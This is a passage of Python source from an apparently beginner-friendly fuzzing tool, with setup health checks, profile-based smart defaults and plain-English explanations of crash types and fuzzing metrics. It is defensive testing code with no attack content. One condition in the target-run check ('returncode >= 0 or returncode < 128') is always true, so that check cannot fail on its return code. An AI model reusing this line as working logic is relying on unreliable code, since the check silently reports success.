    def _check_seeds_reasonable_size(self):
        """Check if seeds are reasonably sized."""
        if not self.seed_dir or not os.path.isdir(self.seed_dir):
            return
        
        large_seeds = []
        total_size = 0
        
        for f in os.listdir(self.seed_dir):
            path = os.path.join(self.seed_dir, f)
            if os.path.isfile(path):
                size = os.path.getsize(path)
                total_size += size
                if size > 1024 * 1024:  # > 1MB
                    large_seeds.append((f, size))
        
        has_large = len(large_seeds) > 0
        
        if has_large:
            self._add_check(HealthCheckResult(
                check_name="Seed Size",
                passed=False,
                severity=HealthCheckSeverity.WARNING,
                message=f"Found {len(large_seeds)} large seed(s)",
                details="Large seeds slow down fuzzing. Smaller seeds (< 1KB) are ideal. " +
                       f"Large files: {', '.join(f'{n} ({s//1024}KB)' for n,s in large_seeds[:3])}",
                fix_suggestion="Use smaller input files. Minimize your seeds while keeping them valid.",
            ))
        else:
            self._add_check(HealthCheckResult(
                check_name="Seed Size",
                passed=True,
                severity=HealthCheckSeverity.OK,
                message="Seed sizes are reasonable",
                details=f"Total seed corpus size: {total_size//1024}KB",
            ))
    
    def _check_output_directory(self):
        """Check if output directory is writable."""
        if not self.output_dir:
            self.output_dir = tempfile.gettempdir()
        
        try:
            os.makedirs(self.output_dir, exist_ok=True)
            # Try to write a test file
            test_file = os.path.join(self.output_dir, ".fuzzer_test")
            with open(test_file, "w") as f:
                f.write("test")
            os.remove(test_file)
            writable = True
        except:
            writable = False
        
        self._add_check(HealthCheckResult(
            check_name="Output Directory",
            passed=writable,
            severity=HealthCheckSeverity.ERROR if not writable else HealthCheckSeverity.OK,
            message="Output directory is writable" if writable else "Cannot write to output directory",
            details=f"Crashes and results will be saved to: {self.output_dir}" if writable else
                   f"Cannot write to: {self.output_dir}",
            fix_suggestion="Check permissions on the output directory, or specify a different location" if not writable else None,
        ))
    
    def _check_disk_space(self):
        """Check available disk space."""
        try:
            if os.name == "nt":
                import ctypes
                free_bytes = ctypes.c_ulonglong(0)
                ctypes.windll.kernel32.GetDiskFreeSpaceExW(
                    ctypes.c_wchar_p(self.output_dir or tempfile.gettempdir()),
                    None, None, ctypes.pointer(free_bytes)
                )
                free_gb = free_bytes.value / (1024**3)
            else:
                stat = os.statvfs(self.output_dir or tempfile.gettempdir())
                free_gb = (stat.f_bavail * stat.f_frsize) / (1024**3)
            
            enough_space = free_gb >= 1.0
            
            self._add_check(HealthCheckResult(
                check_name="Disk Space",
                passed=enough_space,
                severity=HealthCheckSeverity.WARNING if not enough_space else HealthCheckSeverity.OK,
                message=f"{free_gb:.1f}GB available" if enough_space else f"Low disk space: {free_gb:.1f}GB",
                details="Plenty of space for fuzzing results" if enough_space else
                       "Fuzzing generates lots of files. You may run out of space.",
                fix_suggestion="Free up disk space or use a different output directory" if not enough_space else None,
            ))
        except:
            pass
    
    def _check_timeout_reasonable(self):
        """Check if timeout setting is reasonable."""
        if self.timeout_ms < 100:
            severity = HealthCheckSeverity.WARNING
            message = "Timeout is very short"
            details = f"{self.timeout_ms}ms might be too short for most programs to finish"
            fix = "Increase timeout to at least 500ms for most programs"
        elif self.timeout_ms > 30000:
            severity = HealthCheckSeverity.WARNING
            message = "Timeout is very long"
            details = f"{self.timeout_ms}ms (>{self.timeout_ms//1000}s) will make fuzzing slow"
            fix = "Consider reducing timeout unless your program really needs this long"
        else:
            severity = HealthCheckSeverity.OK
            message = "Timeout is reasonable"
            details = f"{self.timeout_ms}ms should work for most programs"
            fix = None
        
        self._add_check(HealthCheckResult(
            check_name="Timeout Setting",
            passed=severity == HealthCheckSeverity.OK,
            severity=severity,
            message=message,
            details=details,
            fix_suggestion=fix,
        ))
    
    def _check_memory_limit(self):
        """Check if memory limit is reasonable."""
        if self.memory_limit_mb < 64:
            severity = HealthCheckSeverity.WARNING
            message = "Memory limit is very low"
            details = f"{self.memory_limit_mb}MB might cause false crashes"
            fix = "Increase memory limit to at least 128MB"
        elif self.memory_limit_mb > 4096:
            severity = HealthCheckSeverity.INFO
            message = "Memory limit is very high"
            details = f"{self.memory_limit_mb}MB allows program to use lots of memory"
            fix = None
        else:
            severity = HealthCheckSeverity.OK
            message = "Memory limit is reasonable"
            details = f"{self.memory_limit_mb}MB should work for most programs"
            fix = None
        
        self._add_check(HealthCheckResult(
            check_name="Memory Limit",
            passed=severity == HealthCheckSeverity.OK,
            severity=severity,
            message=message,
            details=details,
            fix_suggestion=fix,
        ))
    
    def _check_args_placeholder(self):
        """Check if @@ placeholder is used correctly."""
        if "@@" not in self.target_args and self.target_args:
            self._add_check(HealthCheckResult(
                check_name="Input Placeholder",
                passed=True,
                severity=HealthCheckSeverity.INFO,
                message="No @@ placeholder in arguments",
                details="Input will be passed via stdin instead of file. Make sure your program reads from stdin.",
                fix_suggestion="If your program reads from a file, add @@ where the filename should go",
            ))
        elif "@@" in self.target_args:
            self._add_check(HealthCheckResult(
                check_name="Input Placeholder",
                passed=True,
                severity=HealthCheckSeverity.OK,
                message="Input placeholder found",
                details=f"@@ in '{self.target_args}' will be replaced with the test file path",
            ))
    
    def _check_target_runs(self):
        """Try to run the target with a simple input."""
        if not os.path.exists(self.target_path) or not os.access(self.target_path, os.X_OK):
            return
        
        try:
            # Create a minimal test input
            with tempfile.NamedTemporaryFile(delete=False, suffix=".fuzz") as f:
                f.write(b"test")
                test_file = f.name
            
            # Build command
            args = self.target_args.replace("@@", test_file) if "@@" in self.target_args else self.target_args
            cmd = [self.target_path] + args.split() if args else [self.target_path]
            
            # Try to run
            result = subprocess.run(
                cmd,
                input=b"test" if "@@" not in self.target_args else None,
                capture_output=True,
                timeout=min(self.timeout_ms / 1000, 5),
            )
            
            # Clean up
            os.unlink(test_file)
            
            # Check result
            ran_ok = result.returncode >= 0 or result.returncode < 128
            
            self._add_check(HealthCheckResult(
                check_name="Target Runs",
                passed=ran_ok,
                severity=HealthCheckSeverity.OK if ran_ok else HealthCheckSeverity.WARNING,
                message="Target executed successfully" if ran_ok else f"Target returned error code {result.returncode}",
                details="Quick test run completed without crashing" if ran_ok else
                       "Target might have issues. Check if it needs special arguments or dependencies.",
                fix_suggestion=None if ran_ok else "Make sure the target has all required libraries and correct arguments",
            ))
        
        except subprocess.TimeoutExpired:
            self._add_check(HealthCheckResult(
                check_name="Target Runs",
                passed=True,
                severity=HealthCheckSeverity.INFO,
                message="Target timed out on test run",
                details="The program took longer than 5 seconds. This might be normal for some programs.",
                fix_suggestion="If this is unexpected, the program might be waiting for input in a different way",
            ))
        except Exception as e:
            self._add_check(HealthCheckResult(
                check_name="Target Runs",
                passed=False,
                severity=HealthCheckSeverity.WARNING,
                message="Could not run target",
                details=f"Error: {str(e)}",
                fix_suggestion="Check that the target binary is valid and has all required dependencies",
            ))
    
    def _calculate_overall_status(self):
        """Calculate the overall health status."""
        errors = sum(1 for c in self.report.checks if c.severity == HealthCheckSeverity.ERROR)
        warnings = sum(1 for c in self.report.checks if c.severity == HealthCheckSeverity.WARNING)
        
        if errors > 0:
            self.report.overall_status = "error"
            self.report.can_proceed = False
            self.report.summary = f"❌ Cannot start fuzzing: {errors} critical issue(s) found. Please fix them first."
        elif warnings > 0:
            self.report.overall_status = "warning"
            self.report.can_proceed = True
            self.report.summary = f"⚠️ Ready with {warnings} warning(s). You can start, but consider addressing the warnings for better results."
        else:
            self.report.overall_status = "ok"
            self.report.can_proceed = True
            self.report.summary = "✅ All checks passed! Ready to start fuzzing."


# =============================================================================
# SMART DEFAULTS (Beginner Feature 5)
# =============================================================================

class SmartDefaultsEngine:
    """
    Generates intelligent default settings based on context.
    
    Analyzes the target binary, system resources, and fuzzing goals
    to provide optimized settings without requiring user expertise.
    """
    
    # Default profiles for different scenarios
    PROFILES = {
        "quick_test": {
            "name": "Quick Test",
            "description": "Fast feedback for initial testing",
            "timeout_ms": 1000,
            "memory_mb": 128,
            "exec_per_sec_target": 1000,
            "max_duration_minutes": 5,
        },
        "thorough": {
            "name": "Thorough Scan",
            "description": "Deep exploration for production readiness",
            "timeout_ms": 5000,
            "memory_mb": 512,
            "exec_per_sec_target": 100,
            "max_duration_minutes": 60,
        },
        "overnight": {
            "name": "Overnight Run",
            "description": "Extended fuzzing for maximum coverage",
            "timeout_ms": 10000,
            "memory_mb": 1024,
            "exec_per_sec_target": 50,
            "max_duration_minutes": 480,  # 8 hours
        },
        "resource_constrained": {
            "name": "Low Resource",
            "description": "Optimized for limited system resources",
            "timeout_ms": 2000,
            "memory_mb": 64,
            "exec_per_sec_target": 500,
            "max_duration_minutes": 30,
        },
    }
    
    def __init__(self):
        self.system_info = self._get_system_info()
    
    def _get_system_info(self) -> Dict[str, Any]:
        """Get current system resource information."""
        import psutil
        
        try:
            cpu_count = psutil.cpu_count(logical=False) or 1
            cpu_count_logical = psutil.cpu_count(logical=True) or 1
            memory = psutil.virtual_memory()
            disk = psutil.disk_usage("/")
            
            return {
                "cpu_cores_physical": cpu_count,
                "cpu_cores_logical": cpu_count_logical,
                "memory_total_gb": memory.total / (1024**3),
                "memory_available_gb": memory.available / (1024**3),
                "memory_percent_used": memory.percent,
                "disk_free_gb": disk.free / (1024**3),
                "is_resource_constrained": memory.available < 2 * (1024**3) or cpu_count < 2,
            }
        except:
            return {
                "cpu_cores_physical": 2,
                "cpu_cores_logical": 4,
                "memory_total_gb": 8,
                "memory_available_gb": 4,
                "memory_percent_used": 50,
                "disk_free_gb": 50,
                "is_resource_constrained": False,
            }
    
    def get_smart_defaults(
        self,
        binary_analysis: Optional[BinaryAnalysisResult] = None,
        template: Optional[FuzzingTemplate] = None,
        goal: str = "balanced",  # quick_test, thorough, overnight, balanced
        seed_count: int = 0,
        seed_total_size: int = 0,
    ) -> Dict[str, Any]:
        """
        Generate smart default settings based on all available context.
        
        Args:
            binary_analysis: Results from BinaryAutoDetector
            template: Applied FuzzingTemplate if any
            goal: User's fuzzing goal
            seed_count: Number of seed files
            seed_total_size: Total size of seeds in bytes
        
        Returns:
            Dictionary of recommended settings with explanations
        """
        defaults = {}
        explanations = {}
        
        # Start with profile-based defaults
        profile = self.PROFILES.get(goal, self.PROFILES["thorough"])
        
        # Adjust for system resources
        if self.system_info["is_resource_constrained"]:
            profile = self.PROFILES["resource_constrained"]
            explanations["profile"] = "Using low-resource settings due to limited system memory"
        
        # === TIMEOUT ===
        timeout_ms = profile["timeout_ms"]
        timeout_reason = f"Default for {profile['name']} profile"
        
        if binary_analysis:
            # Adjust based on binary type
            if binary_analysis.binary_type == BinaryType.NETWORK_SERVICE:
                timeout_ms = max(timeout_ms, 10000)
                timeout_reason = "Network services need longer timeouts for connections"
            elif binary_analysis.binary_type == BinaryType.FILE_PARSER:
                if binary_analysis.bitness == 64:
                    timeout_ms = max(timeout_ms, 3000)
                    timeout_reason = "64-bit parsers may need extra time"
        
        if template:
            timeout_ms = max(timeout_ms, template.timeout_ms)
            timeout_reason = f"Recommended by '{template.name}' template"
        
        defaults["timeout_ms"] = timeout_ms
        explanations["timeout_ms"] = timeout_reason
        
        # === MEMORY LIMIT ===
        memory_mb = profile["memory_mb"]
        memory_reason = f"Default for {profile['name']} profile"
        
        # Scale based on available system memory
        available_gb = self.system_info["memory_available_gb"]
        max_memory = int(available_gb * 1024 * 0.25)  # Use at most 25% of available
        
        if binary_analysis:
            if binary_analysis.bitness == 64:
                memory_mb = max(memory_mb, 512)
                memory_reason = "64-bit binaries typically need more memory"
            if binary_analysis.binary_type in [BinaryType.FILE_PARSER]:
                # Check for media/document hints
                for func in binary_analysis.input_functions:
                    if any(x in func.lower() for x in ["video", "audio", "pdf", "image"]):
                        memory_mb = max(memory_mb, 1024)
                        memory_reason = "Media/document parsers need extra memory"
                        break
        
        if template:
            memory_mb = max(memory_mb, template.memory_limit_mb)
            memory_reason = f"Recommended by '{template.name}' template"
        
        # Cap at system limit
        if memory_mb > max_memory:
            memory_mb = max_memory
            memory_reason = f"Capped to 25% of available system memory ({available_gb:.1f}GB available)"
        
        defaults["memory_limit_mb"] = memory_mb
        explanations["memory_limit_mb"] = memory_reason
        
        # === PARALLEL JOBS ===
        cpu_cores = self.system_info["cpu_cores_physical"]
        jobs = max(1, cpu_cores - 1)  # Leave one core free
        
        if goal == "quick_test":
            jobs = 1
            jobs_reason = "Single job for quick testing"
        elif self.system_info["is_resource_constrained"]:
            jobs = 1
            jobs_reason = "Limited to 1 job due to resource constraints"
        else:
            jobs_reason = f"Using {jobs} parallel jobs ({cpu_cores} cores available)"
        
        defaults["parallel_jobs"] = jobs
        explanations["parallel_jobs"] = jobs_reason
        
        # === FUZZING MODE ===
        mode = FuzzingMode.COVERAGE_GUIDED
        mode_reason = "Coverage-guided fuzzing is most effective"
        
        if binary_analysis:
            if binary_analysis.is_stripped and not binary_analysis.is_pie:
                mode = FuzzingMode.COVERAGE_GUIDED  # Still coverage-guided but needs QEMU
                mode_reason = "Coverage-guided with QEMU (binary is stripped)"
        
        defaults["mode"] = mode.value
        explanations["mode"] = mode_reason
        
        # === QEMU MODE ===
        use_qemu = False
        qemu_reason = "Native instrumentation (fastest)"
        
        if binary_analysis:
            if binary_analysis.is_stripped:
                use_qemu = True
                qemu_reason = "Binary is stripped - using QEMU for coverage"
            elif binary_analysis.architecture not in ["x86", "x86_64", "amd64"]:
                use_qemu = True
                qemu_reason = f"Non-x86 architecture ({binary_analysis.architecture}) - using QEMU"
        
        defaults["use_qemu"] = use_qemu
        explanations["use_qemu"] = qemu_reason
        
        # === TARGET ARGS ===
        target_args = "@@"
        args_reason = "Standard file input placeholder"
        
        if binary_analysis:
            target_args = binary_analysis.suggested_args
            if binary_analysis.input_type == InputType.STDIN:
                target_args = ""
                args_reason = "Binary reads from stdin (no arguments needed)"
            elif binary_analysis.input_type == InputType.FILE:
                args_reason = "Binary reads from file argument"
        
        if template and template.target_args:
            target_args = template.target_args
            args_reason = f"Recommended by '{template.name}' template"
        
        defaults["target_args"] = target_args
        explanations["target_args"] = args_reason
        
        # === DICTIONARY ===
        use_dictionary = False
        dict_reason = "No dictionary needed for basic fuzzing"
        
        if template and template.dictionary_words:
            use_dictionary = True
            dict_reason = f"Template includes {len(template.dictionary_words)} dictionary words"
        
        defaults["use_dictionary"] = use_dictionary
        explanations["use_dictionary"] = dict_reason
        
        # === SEED CORPUS SETTINGS ===
        if seed_count == 0:
            defaults["generate_seeds"] = True
            explanations["generate_seeds"] = "No seeds provided - we'll generate basic ones"
        else:
            defaults["generate_seeds"] = False
            avg_seed_size = seed_total_size / seed_count if seed_count > 0 else 0
            if avg_seed_size > 10 * 1024:  # > 10KB average
                defaults["minimize_seeds"] = True
                explanations["minimize_seeds"] = "Large seeds detected - minimization recommended"
            else:
                defaults["minimize_seeds"] = False
                explanations["minimize_seeds"] = "Seed sizes are reasonable"
        
        # === MUTATION STRATEGY ===
        mutation = "balanced"
        mutation_reason = "Balanced mutation covers most cases"
        
        if binary_analysis:
            if binary_analysis.binary_type == BinaryType.FILE_PARSER:
                mutation = "structure_aware"
                mutation_reason = "Structure-aware mutation better for file parsers"
        
        defaults["mutation_strategy"] = mutation
        explanations["mutation_strategy"] = mutation_reason
        
        return {
            "defaults": defaults,
            "explanations": explanations,
            "profile_used": profile["name"],
            "profile_description": profile["description"],
            "system_info": {
                "cpu_cores": self.system_info["cpu_cores_physical"],
                "memory_available_gb": round(self.system_info["memory_available_gb"], 1),
                "is_resource_constrained": self.system_info["is_resource_constrained"],
            },
            "summary": self._generate_summary(defaults, explanations),
        }
    
    def _generate_summary(self, defaults: Dict, explanations: Dict) -> str:
        """Generate a human-readable summary of the defaults."""
        lines = ["📋 **Smart Defaults Summary**", ""]
        
        lines.append(f"⏱️ Timeout: {defaults.get('timeout_ms', 5000)}ms")
        lines.append(f"💾 Memory: {defaults.get('memory_limit_mb', 256)}MB")
        lines.append(f"🔄 Parallel Jobs: {defaults.get('parallel_jobs', 1)}")
        lines.append(f"🎯 Mode: {defaults.get('mode', 'coverage_guided')}")
        
        if defaults.get('use_qemu'):
            lines.append("🖥️ Using QEMU emulation")
        
        lines.append("")
        lines.append("These settings are optimized for your setup!")
        
        return "\n".join(lines)
    
    def get_profile_options(self) -> List[Dict[str, Any]]:
        """Get available fuzzing profiles."""
        return [
            {
                "id": pid,
                "name": profile["name"],
                "description": profile["description"],
                "estimated_duration": f"{profile['max_duration_minutes']} minutes",
            }
            for pid, profile in self.PROFILES.items()
        ]
    
    def recommend_profile(
        self,
        available_time_minutes: Optional[int] = None,
        goal: Optional[str] = None,
    ) -> Dict[str, Any]:
        """Recommend a fuzzing profile based on constraints."""
        
        # Resource-constrained systems
        if self.system_info["is_resource_constrained"]:
            return {
                "recommended": "resource_constrained",
                "reason": "Your system has limited resources",
                "alternatives": ["quick_test"],
            }
        
        # Based on available time
        if available_time_minutes:
            if available_time_minutes <= 10:
                return {
                    "recommended": "quick_test",
                    "reason": f"Best for short sessions ({available_time_minutes} min available)",
                    "alternatives": [],
                }
            elif available_time_minutes <= 60:
                return {
                    "recommended": "thorough",
                    "reason": f"Good balance for {available_time_minutes} minutes",
                    "alternatives": ["quick_test"],
                }
            else:
                return {
                    "recommended": "overnight",
                    "reason": f"Extended fuzzing for {available_time_minutes} minutes",
                    "alternatives": ["thorough"],
                }
        
        # Based on goal
        if goal == "find_bugs_fast":
            return {
                "recommended": "quick_test",
                "reason": "Optimized for fast feedback",
                "alternatives": ["thorough"],
            }
        elif goal == "maximize_coverage":
            return {
                "recommended": "overnight",
                "reason": "Maximum coverage requires extended runs",
                "alternatives": ["thorough"],
            }
        
        # Default recommendation
        return {
            "recommended": "thorough",
            "reason": "Good balance of speed and thoroughness",
            "alternatives": ["quick_test", "overnight"],
        }


# =============================================================================
# PLAIN ENGLISH EXPLANATIONS (Beginner Feature 6)
# =============================================================================

class PlainEnglishExplainer:
    """
    Translates technical fuzzing jargon into beginner-friendly explanations.
    
    Provides clear, actionable explanations for crashes, metrics,
    coverage data, and all aspects of fuzzing results.
    """
    
    # Crash type explanations
    CRASH_EXPLANATIONS = {
        CrashType.SEGFAULT: {
            "title": "Memory Access Error",
            "simple": "The program tried to access memory it shouldn't.",
            "detail": """
**What happened?**
The program attempted to read or write to a memory address that it doesn't 
have permission to access. This is like trying to open a door to a room 
you're not allowed in.

**Why does this matter?**
This is a serious bug! Attackers could potentially exploit this to:
- Crash the program (denial of service)
- Read sensitive data they shouldn't see
- In some cases, even run their own code

**What should I do?**
1. Save the crashing input (we've done this for you)
2. Run the program with this input in a debugger to find the exact line
3. Check for buffer overflows, use-after-free, or null pointer dereferences
            """,
            "severity_hint": "🔴 High severity - prioritize fixing this",
        },
        CrashType.ABORT: {
            "title": "Program Aborted",
            "simple": "The program detected something wrong and stopped itself.",
            "detail": """
**What happened?**
The program called abort() or triggered an assertion failure. This means 
the program's own checks detected an invalid state and decided to stop 
rather than continue with potentially corrupted data.

**Why does this matter?**
While this is safer than continuing with bad data, it still indicates a bug.
The program reached a state its developers thought was impossible.

**What should I do?**
1. Look at the assertion message in the output
2. The input that caused this reveals an edge case the code doesn't handle
3. Add proper error handling instead of assertions for user input
            """,
            "severity_hint": "🟡 Medium severity - the program protected itself",
        },
        CrashType.TIMEOUT: {
            "title": "Program Hung",
            "simple": "The program took too long and was stopped.",
            "detail": """
**What happened?**
The program didn't finish within the time limit we set. It might be stuck 
in an infinite loop, waiting for something, or just processing very slowly.

**Why does this matter?**
Hangs can be used for denial-of-service attacks. An attacker could send 
inputs that make your program unresponsive.

**What should I do?**
1. Check if the input causes an infinite loop
2. Look for recursive functions that might not terminate
3. Check for deadlocks if the program is multi-threaded
4. Sometimes this is just a slow operation - consider if the timeout is too short
            """,
            "severity_hint": "🟡 Medium severity - potential denial of service",
        },
        CrashType.HEAP_CORRUPTION: {
            "title": "Memory Corruption",
            "simple": "The program damaged its own memory structures.",
            "detail": """
**What happened?**
The program wrote data where it shouldn't, corrupting the memory manager's 
internal data structures. This is like scribbling over important notes.

**Why does this matter?**
This is a **critical** security bug! Heap corruption can often be exploited to:
- Execute arbitrary code (remote code execution)
- Bypass security checks
- Gain elevated privileges

**What should I do?**
1. This needs immediate attention
2. Run with AddressSanitizer to find the exact corruption
3. Look for buffer overflows, double-frees, or use-after-free bugs
4. Consider this high priority for security review
            """,
            "severity_hint": "🔴 Critical severity - potential code execution",
        },
        CrashType.STACK_OVERFLOW: {
            "title": "Stack Overflow",
            "simple": "The program ran out of stack space.",
            "detail": """
**What happened?**
The program used too much stack memory, usually from deeply nested function 
calls or very large local variables. Think of it like stacking too many 
plates until they fall over.

**Why does this matter?**
Stack overflows can sometimes be exploited, especially if the overflow 
overwrites return addresses. Even when not exploitable, they crash the program.

**What should I do?**
1. Look for recursive functions - the input may cause very deep recursion
2. Check for large arrays allocated on the stack
3. Consider limiting recursion depth or using iteration instead
            """,
            "severity_hint": "🟠 High severity - crash and potential exploit",
        },
        CrashType.NULL_DEREF: {
            "title": "Null Pointer Error",
            "simple": "The program tried to use an invalid (null) reference.",
            "detail": """
**What happened?**
The program tried to access memory through a pointer that was set to null 
(meaning "nothing"). It's like trying to read a book that doesn't exist.

**Why does this matter?**
While null dereferences usually just crash the program, they indicate 
missing error checking. The program should have verified the pointer was 
valid before using it.

**What should I do?**
1. Find where the null pointer came from
2. Add null checks before dereferencing
3. Consider why the pointer was null - was an allocation failed? Was data missing?
            """,
            "severity_hint": "🟡 Medium severity - crash, usually not exploitable",
        },
        CrashType.DIVISION_BY_ZERO: {
            "title": "Division by Zero",
            "simple": "The program tried to divide by zero.",
            "detail": """
**What happened?**
A mathematical operation attempted to divide by zero, which is undefined.
The CPU raised an exception and the program crashed.

**Why does this matter?**
While not usually exploitable, this crash reveals missing input validation.
Attackers could use this for denial of service.

**What should I do?**
1. Find the division operation
2. Add a check to ensure the divisor isn't zero
3. Decide what to do when it would be zero (return error, use default value, etc.)
            """,
            "severity_hint": "🟢 Low severity - crash, not exploitable",
        },
        CrashType.UNKNOWN: {
            "title": "Unknown Crash",
            "simple": "The program crashed in an unexpected way.",
            "detail": """
**What happened?**
We detected a crash but couldn't determine the exact type. This could be 
any number of issues.

**What should I do?**
1. Run the crashing input manually and check the error message
2. Use a debugger to see where exactly the crash occurs
3. Try running with sanitizers (ASan, UBSan) for more details
            """,
            "severity_hint": "🟡 Unknown severity - needs investigation",
        },
    }
    
    # Metric explanations
    METRIC_EXPLANATIONS = {
        "executions": {
            "name": "Executions",
            "simple": "How many times we've run your program with different inputs.",
            "detail": "Each execution tests a different input. More executions = more testing.",
            "good_value": "1,000+ per second is good, 10,000+ is great",
        },
        "exec_per_sec": {
            "name": "Speed",
            "simple": "How many tests we can run per second.",
            "detail": "Faster is better - it means we can test more inputs in less time.",
            "good_value": "100+ is okay, 1,000+ is good, 10,000+ is excellent",
        },
        "coverage": {
            "name": "Code Coverage",
            "simple": "What percentage of your code we've tested.",
            "detail": "We track which parts of your program have been executed. Higher coverage means we've explored more of your code.",
            "good_value": "Start low, should grow over time. 60%+ is good.",
        },
        "paths": {
            "name": "Unique Paths",
            "simple": "Different execution routes through your program.",
            "detail": "Each path represents a unique sequence of decisions in your code. More paths = more thorough testing.",
            "good_value": "Should grow over time. Hundreds to thousands is normal.",
        },
        "crashes": {
            "name": "Crashes Found",
            "simple": "Inputs that make your program crash.",
            "detail": "Each unique crash is potentially a bug. We deduplicate so each one is different.",
            "good_value": "Any crash is worth investigating!",
        },
        "hangs": {
            "name": "Hangs Found",
            "simple": "Inputs that make your program get stuck.",
            "detail": "These inputs cause your program to run forever or much longer than expected.",
            "good_value": "Often less critical than crashes, but still worth checking.",
        },
        "corpus_size": {
            "name": "Corpus Size",
            "simple": "The collection of interesting inputs we've discovered.",
            "detail": "As we fuzz, we save inputs that explore new code paths. This corpus grows over time.",
            "good_value": "Should grow then stabilize. Hundreds to thousands is typical.",
        },
        "stability": {
            "name": "Stability",
            "simple": "How consistent your program's behavior is.",
            "detail": "If the same input gives different results each time, stability is low. This can make fuzzing less effective.",
            "good_value": "90%+ is good. Below 80% may indicate threading issues.",
        },
    }
    
    def __init__(self):
        pass
    
    def explain_crash(self, crash_type: CrashType) -> Dict[str, Any]:
        """Get a beginner-friendly explanation of a crash type."""
        explanation = self.CRASH_EXPLANATIONS.get(
            crash_type, 
            self.CRASH_EXPLANATIONS[CrashType.UNKNOWN]
        )
        return {
            "crash_type": crash_type.value,
            **explanation,
        }
    
    def explain_crash_report(self, crash_data: Dict[str, Any]) -> Dict[str, Any]:
        """
        Generate a complete beginner-friendly crash report.
        
        Args:
            crash_data: Crash information dictionary
        
        Returns:
            Beginner-friendly explanation with action items
        """
        crash_type = CrashType(crash_data.get("crash_type", "unknown"))
        base_explanation = self.explain_crash(crash_type)
        
        # Add specific context
        result = {
            **base_explanation,
            "input_file": crash_data.get("input_file"),
            "what_to_do_next": [
                f"1. Find the saved crashing input: {crash_data.get('input_file', 'check output directory')}",
                "2. Run your program with this input to reproduce the crash",
                "3. Use a debugger (GDB, LLDB) to find the exact crash location",
                "4. Fix the bug and re-test with the same input",
            ],
            "reproduction_command": self._generate_repro_command(crash_data),
        }
        
        # Add sanitizer suggestion if applicable
        if crash_type in [CrashType.HEAP_CORRUPTION, CrashType.SEGFAULT, CrashType.STACK_OVERFLOW]:
            result["pro_tip"] = "💡 Recompile with AddressSanitizer (-fsanitize=address) for more detailed error messages"
        
        return result
    
    def _generate_repro_command(self, crash_data: Dict[str, Any]) -> str:
        """Generate a command to reproduce the crash."""
        target = crash_data.get("target_path", "./your_program")
        input_file = crash_data.get("input_file", "crash_input")
        args = crash_data.get("target_args", "@@").replace("@@", input_file)
        return f"{target} {args}"
    
    def explain_metric(self, metric_name: str, value: Any) -> Dict[str, Any]:
        """Get explanation for a fuzzing metric."""
        explanation = self.METRIC_EXPLANATIONS.get(metric_name, {
            "name": metric_name,
            "simple": f"A fuzzing metric: {metric_name}",
            "detail": "No detailed explanation available.",
            "good_value": "Unknown",
        })
        
        # Add value assessment
        assessment = self._assess_metric_value(metric_name, value)
        
        return {
            "metric": metric_name,
            "value": value,
            **explanation,
            "assessment": assessment,
        }
    
    def _assess_metric_value(self, metric_name: str, value: Any) -> Dict[str, str]:
        """Assess whether a metric value is good, okay, or concerning."""
        if metric_name == "exec_per_sec":
            if value >= 10000:
                return {"rating": "excellent", "emoji": "🚀", "message": "Extremely fast!"}
            elif value >= 1000:
                return {"rating": "good", "emoji": "✅", "message": "Good speed"}
            elif value >= 100:
                return {"rating": "okay", "emoji": "👍", "message": "Acceptable speed"}
            else:
                return {"rating": "slow", "emoji": "🐢", "message": "Slow - consider optimization"}
        
        elif metric_name == "coverage":
            if value >= 80:
                return {"rating": "excellent", "emoji": "🎯", "message": "Great coverage!"}
            elif value >= 60:
                return {"rating": "good", "emoji": "✅", "message": "Good coverage"}
            elif value >= 40:
                return {"rating": "okay", "emoji": "👍", "message": "Moderate coverage"}
            else:
                return {"rating": "low", "emoji": "📈", "message": "Coverage could improve"}
        
        elif metric_name == "stability":
            if value >= 95:
                return {"rating": "excellent", "emoji": "🎯", "message": "Very stable"}
            elif value >= 80:
                return {"rating": "good", "emoji": "✅", "message": "Stable enough"}
            else:
                return {"rating": "concerning", "emoji": "⚠️", "message": "Low stability - may have threading issues"}
        
        elif metric_name == "crashes":
            if value == 0:
                return {"rating": "none", "emoji": "✨", "message": "No crashes yet"}
            elif value <= 5:
                return {"rating": "some", "emoji": "🔍", "message": f"{value} unique crashes to investigate"}
            else:
                return {"rating": "many", "emoji": "🐛", "message": f"{value} crashes - lots to look at!"}
        
        return {"rating": "unknown", "emoji": "❓", "message": ""}
    
    def explain_session_status(self, session_data: Dict[str, Any]) -> Dict[str, Any]:
        """Generate a beginner-friendly session status summary."""
        status = session_data.get("status", "unknown")
        
        status_explanations = {
            "running": {
                "emoji": "🔄",
                "title": "Fuzzing in Progress",
                "message": "We're actively testing your program with different inputs.",
            },
            "stopped": {
                "emoji": "⏹️",
                "title": "Fuzzing Stopped",
                "message": "The fuzzing session has been stopped.",
            },
            "completed": {
                "emoji": "✅",
                "title": "Fuzzing Complete",
                "message": "The fuzzing session finished successfully.",
            },
            "error": {
                "emoji": "❌",
                "title": "Error Occurred",
                "message": "Something went wrong during fuzzing.",
            },
        }
        
        explanation = status_explanations.get(status, {
            "emoji": "❓",
            "title": "Unknown Status",
            "message": f"Session status: {status}",
        })
        
        # Build summary
        executions = session_data.get("total_executions", 0)
        crashes = session_data.get("unique_crashes", 0)
        coverage = session_data.get("coverage_percent", 0)
        duration = session_data.get("duration_seconds", 0)
        
        summary_parts = []
        if executions > 0:
            summary_parts.append(f"Ran {executions:,} tests")
        if crashes > 0:
            summary_parts.append(f"found {crashes} crash{'es' if crashes > 1 else ''}")
        if coverage > 0:
            summary_parts.append(f"covered {coverage:.1f}% of code")
        if duration > 0:
            mins = duration // 60
            summary_parts.append(f"in {mins} minute{'s' if mins != 1 else ''}" if mins > 0 else f"in {duration}s")
        
        return {
            **explanation,
            "status": status,
            "summary": " • ".join(summary_parts) if summary_parts else "No data yet",
            "metrics": {
                "executions": self.explain_metric("executions", executions),
                "crashes": self.explain_metric("crashes", crashes),
                "coverage": self.explain_metric("coverage", coverage),
            },
            "next_steps": self._suggest_next_steps(session_data),
        }
    
    def _suggest_next_steps(self, session_data: Dict[str, Any]) -> List[str]:
        """Suggest next steps based on session status."""
        status = session_data.get("status", "unknown")
        crashes = session_data.get("unique_crashes", 0)
        coverage = session_data.get("coverage_percent", 0)
        
        steps = []
        
        if status == "running":
            steps.append("⏳ Let it run - fuzzing takes time to find bugs")
            if crashes > 0:
                steps.append(f"🔍 Check out the {crashes} crash(es) found so far")
        
        elif status in ["stopped", "completed"]:
            if crashes > 0:
                steps.append(f"🐛 Investigate the {crashes} crash(es) we found")
                steps.append("📝 Use the crash inputs to reproduce and fix bugs")
            else:
